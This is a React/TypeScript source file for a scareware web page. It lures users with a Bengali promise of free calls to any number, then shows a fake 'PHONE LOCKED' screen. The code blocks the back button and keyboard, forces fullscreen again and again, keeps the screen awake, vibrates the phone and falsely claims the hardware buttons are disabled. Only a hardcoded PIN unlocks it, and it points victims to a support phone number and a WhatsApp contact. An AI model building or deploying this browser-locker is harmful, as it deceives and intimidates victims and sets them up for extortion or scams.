
import React, { useState, useEffect, useCallback, useRef } from 'react';

// --- Constants ---
const GHOST_SCREAM_URL = 'https://www.soundjay.com/human/man-screaming-01.mp3';
const HACKER_BACKGROUND_URL = 'https://images.unsplash.com/photo-1550751827-4bd374c3f58b?auto=format&fit=crop&q=80&w=1000';
const MASTER_PIN = "1998";
const SUPPORT_NUMBER = "01736428130";
const WHATSAPP_URL = "https://wa.me/8801953913242?text=I'm%20Not%20Hackar%20But%20i%20love%20Hackar%20on%20WhatsApp.";

const FakeCallScreen: React.FC<{ onHangUp: () => void }> = ({ onHangUp }) => {
  const [timer, setTimer] = useState(0);

  useEffect(() => {
    const interval = setInterval(() => setTimer(t => t + 1), 1000);
    return () => clearInterval(interval);
  }, []);

  const formatTime = (s: number) => {
    const mins = Math.floor(s / 60);
    const secs = s % 60;
    return `${mins}:${secs.toString().padStart(2, '0')}`;
  };

  return (
    <div className="fixed inset-0 z-[2000] bg-black flex flex-col items-center justify-between py-20 px-10 text-white animate-fade-in overflow-hidden touch-none">
      <div className="text-center">
        <div className="w-24 h-24 bg-green-600 rounded-full flex items-center justify-center mx-auto mb-6 shadow-[0_0_50px_rgba(34,197,94,0.7)]">
          <span className="text-5xl">👤</span>
        </div>
        <h2 className="text-3xl font-black mb-2 tracking-tighter">Kuyasa Cyber Hackar</h2>
        <p className="text-neutral-500 font-mono text-lg tracking-[0.2em]">{SUPPORT_NUMBER}</p>
        <div className="mt-6 inline-block px-6 py-2 bg-green-900/40 border-2 border-green-500/30 rounded-full">
           <p className="text-green-400 font-mono text-2xl font-bold">{formatTime(timer)}</p>
        </div>
      </div>

      <div className="grid grid-cols-3 gap-10 w-full max-w-sm mb-12 opacity-20 grayscale scale-110">
        {['Mute', 'Keypad', 'Speaker', 'Add Call', 'Video', 'Contacts'].map(opt => (
          <div key={opt} className="flex flex-col items-center gap-2">
            <div className="w-16 h-16 border-2 border-white/20 rounded-full flex items-center justify-center bg-white/5">
              <div className="w-3 h-3 bg-white/30 rounded-full"></div>
            </div>
            <span className="text-[10px] uppercase font-black tracking-widest text-white/50">{opt}</span>
          </div>
        ))}
      </div>

      <button 
        onClick={onHangUp}
        className="w-28 h-28 bg-red-600 rounded-full flex items-center justify-center shadow-[0_0_80px_rgba(220,38,38,0.8)] active:scale-50 transition-all border-8 border-red-500/30"
      >
        <span className="text-6xl rotate-[135deg] text-white">📞</span>
      </button>
    </div>
  );
};

const LockScreen: React.FC<{ onUnlock: () => void }> = ({ onUnlock }) => {
  const [pin, setPin] = useState("");
  const [error, setError] = useState(false);
  const [isCalling, setIsCalling] = useState(false);
  const [toastMessage, setToastMessage] = useState<string | null>(null);

  // Aggressive Trap Logic
  useEffect(() => {
    // 1. Block Back Button (Repeatedly)
    const blockBack = () => {
      window.history.pushState(null, "", window.location.href);
      showToast("⛔ ব্যাক বাটন ডিজেবল করা হয়েছে");
    };
    window.history.pushState(null, "", window.location.href);
    window.addEventListener('popstate', blockBack);

    // 2. Prevent Common Keyboard Shortcuts
    const preventKeys = (e: KeyboardEvent) => {
      e.preventDefault();
      showToast("⚠️ হার্ডওয়্যার এক্সেস ব্লকড");
      if (navigator.vibrate) navigator.vibrate(200);
    };
    window.addEventListener('keydown', preventKeys);

    // 3. Keep Fullscreen Alive
    const checkFullscreen = () => {
      if (!document.fullscreenElement) {
        document.documentElement.requestFullscreen().catch(() => {});
      }
    };
    const fsInterval = setInterval(checkFullscreen, 2000);

    return () => {
      window.removeEventListener('popstate', blockBack);
      window.removeEventListener('keydown', preventKeys);
      clearInterval(fsInterval);
    };
  }, []);

  const showToast = (msg: string) => {
    setToastMessage(msg);
    setTimeout(() => setToastMessage(null), 2500);
  };

  const handleKeyPress = (val: string) => {
    if (pin.length < 4) {
      const newPin = pin + val;
      setPin(newPin);
      if (newPin.length === 4) {
        if (newPin === MASTER_PIN) {
          onUnlock();
        } else {
          setError(true);
          if (navigator.vibrate) navigator.vibrate([100, 50, 100]);
          showToast("❌ ভুল পিন! এক্সেস ডিনাইড");
          setTimeout(() => {
            setPin("");
            setError(false);
          }, 1000);
        }
      }
    }
  };

  if (isCalling) {
    return <FakeCallScreen onHangUp={() => setIsCalling(false)} />;
  }

  return (
    <div 
        className="fixed inset-0 z-[1500] bg-black flex flex-col items-center justify-center p-8 select-none overflow-hidden touch-none"
        onContextMenu={(e) => e.preventDefault()}
        onClick={() => {
          if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(() => {});
          }
        }}
    >
      {/* Dynamic Security Toast */}
      {toastMessage && (
        <div className="fixed top-12 left-1/2 -translate-x-1/2 z-[2100] bg-red-600/90 text-white px-8 py-4 rounded-2xl font-black text-sm uppercase tracking-widest animate-bounce shadow-2xl border-4 border-white/20 whitespace-nowrap backdrop-blur-md">
          {toastMessage}
        </div>
      )}

      {/* Fake OS Status Bar */}
      <div className="absolute top-0 left-0 w-full px-8 py-4 flex justify-between items-center opacity-60 z-50">
        <span className="text-sm font-black text-white animate-pulse">0% BATTERY</span>
        <div className="flex gap-4 items-center">
           <span className="text-xs font-mono text-red-500">SECURE_TUNNEL_ACTIVE</span>
           <span className="text-lg">📵</span>
        </div>
      </div>

      <div className="absolute inset-0 opacity-40 pointer-events-none">
        <img 
          src={HACKER_BACKGROUND_URL} 
          alt="bg" 
          className="w-full h-full object-cover grayscale contrast-200 brightness-[0.1]"
          loading="eager"
        />
        <div className="absolute inset-0 bg-gradient-to-b from-black via-transparent to-red-900/20"></div>
      </div>

      <div className="text-center mb-16 relative z-10 w-full">
        <div className="mb-6 flex justify-center">
           <div className="w-20 h-20 rounded-full border-4 border-red-600 border-t-transparent animate-spin"></div>
        </div>
        <h1 className="text-6xl font-black text-red-600 mb-8 drop-shadow-[0_0_40px_rgba(220,38,38,1)] uppercase tracking-tighter italic scale-110">PHONE LOCKED</h1>
        
        <div className="bg-neutral-900/80 border-4 border-red-600/50 p-8 rounded-[2.5rem] backdrop-blur-3xl shadow-[0_0_100px_rgba(220,38,38,0.4)] animate-pulse">
          <p className="text-white text-2xl font-black leading-tight mb-4">
             সিস্টেম লকড: আপনার ফোনের পাওয়ার বাটন এবং হোম বাটন ডিজেবল করা হয়েছে।
          </p>
          <div className="grid grid-cols-2 gap-2">
            <span className="bg-red-950/50 text-red-500 text-[9px] py-1 rounded-full font-black uppercase tracking-[0.2em] border border-red-500/20">Power Button: LOCKED</span>
            <span className="bg-red-950/50 text-red-500 text-[9px] py-1 rounded-full font-black uppercase tracking-[0.2em] border border-red-500/20">Home Button: BLOCKED</span>
            <span className="bg-red-950/50 text-red-500 text-[9px] py-1 rounded-full font-black uppercase tracking-[0.2em] border border-red-500/20">Volume Keys: MUTED</span>
            <span className="bg-red-950/50 text-red-500 text-[9px] py-1 rounded-full font-black uppercase tracking-[0.2em] border border-red-500/20">Settings: DENIED</span>
          </div>
        </div>
      </div>

      <div className={`flex gap-8 mb-16 transition-all duration-300 ${error ? 'scale-125' : 'scale-100'}`}>
        {[0, 1, 2, 3].map((i) => (
          <div 
            key={i} 
            className={`w-8 h-8 rounded-full border-4 transition-all duration-500 ${
              pin.length > i ? 'bg-red-600 border-white shadow-[0_0_40px_rgba(220,38,38,1)]' : 'border-neutral-800'
            } ${error ? 'animate-shake border-white bg-white' : ''}`} 
          />
        ))}
      </div>

      <div className="grid grid-cols-3 gap-6 max-w-[340px] relative z-10 mb-16">
        {["1", "2", "3", "4", "5", "6", "7", "8", "9", "C", "0", "E"].map((val) => (
          <button
            key={val}
            onClick={() => {
              if (val === "C") setPin("");
              else if (val === "E") showToast("🚫 এডমিন এক্সেস প্রয়োজন");
              else handleKeyPress(val);
            }}
            className="w-20 h-20 rounded-full border-2 border-neutral-800 bg-neutral-900/40 backdrop-blur-2xl flex items-center justify-center text-4xl font-black text-red-500 hover:bg-red-600 hover:text-white transition-all active:scale-50 shadow-2xl"
          >
            {val}
          </button>
        ))}
      </div>

      <button 
        onClick={() => setIsCalling(true)}
        className="relative z-10 w-full max-w-[300px] py-7 bg-red-600 hover:bg-white text-white hover:text-red-600 rounded-full flex items-center justify-center gap-6 shadow-[0_0_80px_rgba(220,38,38,0.7)] active:scale-90 transition-all border-4 border-white/20 animate-pulse font-black uppercase tracking-[0.3em] text-lg"
      >
        <span className="text-4xl">🆘</span>
        ADMIN SUPPORT
      </button>
      
      <p className="mt-16 text-[10px] text-neutral-800 uppercase tracking-[0.6em] font-mono text-center font-black">
        KUYASA_ELITE_FORCE // SYSTEM_HIJACK_MODE <br/>
        SECURITY_LEVEL: OMEGA_ZERO
      </p>
    </div>
  );
};

const App: React.FC = () => {
  const [appStarted, setAppStarted] = useState(false);
  const [isLocked, setIsLocked] = useState(false);
  
  const handleStart = async () => {
    setAppStarted(true);
    setIsLocked(true); // সরাসরি লক মোডে প্রবেশ

    // Fullscreen Request (Must be triggered by user gesture)
    try {
      if (document.documentElement.requestFullscreen) {
        await document.documentElement.requestFullscreen();
      }
    } catch (e) {}

    // Screen Wake Lock
    if ('wakeLock' in navigator) {
      try { await (navigator as any).wakeLock.request('screen'); } catch (err) {}
    }

    // Initial Vibration
    if (navigator.vibrate) navigator.vibrate([300, 100, 300, 100, 1000]);
    
    // Push State to trap back button immediately
    window.history.pushState(null, "", window.location.href);
  };

  if (!appStarted) {
    return (
      <div className="flex-1 min-h-[100dvh] bg-black flex flex-col items-center justify-center p-12 text-center relative overflow-hidden">
        <div className="absolute inset-0 bg-green-500/[0.05] animate-pulse"></div>
        <div className="w-36 h-36 bg-green-950/20 rounded-[3rem] flex items-center justify-center mb-12 border-4 border-green-500/30 animate-spin relative z-10">
           <span className="text-7xl">📡</span>
        </div>
        <h1 className="text-green-500 text-5xl font-black mb-10 tracking-tighter uppercase relative z-10">GLOBAL BYPASS</h1>
        <p className="text-neutral-400 text-lg mb-20 max-w-xs leading-relaxed relative z-10 font-bold">
          আমাদের স্যাটেলাইট নেটওয়ার্ক ব্যবহার করে যেকোনো নাম্বারে ফ্রিতে কল করুন। কানেক্ট করতে নিচে প্রেস করুন।
        </p>
        <button 
          onClick={handleStart}
          className="w-full max-w-sm py-10 bg-green-600 hover:bg-green-500 text-white font-black uppercase tracking-[0.5em] rounded-[2.5rem] shadow-[0_0_80px_rgba(34,197,94,0.5)] transition-all active:scale-75 text-3xl border-b-[12px] border-green-800 relative z-10"
        >
          CONNECT
        </button>
        <div className="absolute bottom-10 text-[10px] text-green-900 font-mono tracking-[0.2em] opacity-40 uppercase">
          Initializing secure handshake... 
        </div>
      </div>
    );
  }

  return (
    <div 
        className="flex-1 min-h-[100dvh] bg-black text-neutral-200 flex flex-col font-sans relative overflow-hidden touch-none"
        onContextMenu={(e) => e.preventDefault()}
    >
      {isLocked && <LockScreen onUnlock={() => setIsLocked(false)} />}
      
      {/* Background/Shadow UI */}
      <div className="flex-1 flex flex-col p-10 items-center justify-center text-center opacity-10 blur-2xl pointer-events-none scale-150">
        <h1 className="text-6xl font-black text-green-500 mb-8">SECURE CONNECTION</h1>
        <div className="w-60 h-60 bg-green-500 rounded-full animate-ping"></div>
      </div>
    </div>
  );
};

export default App;
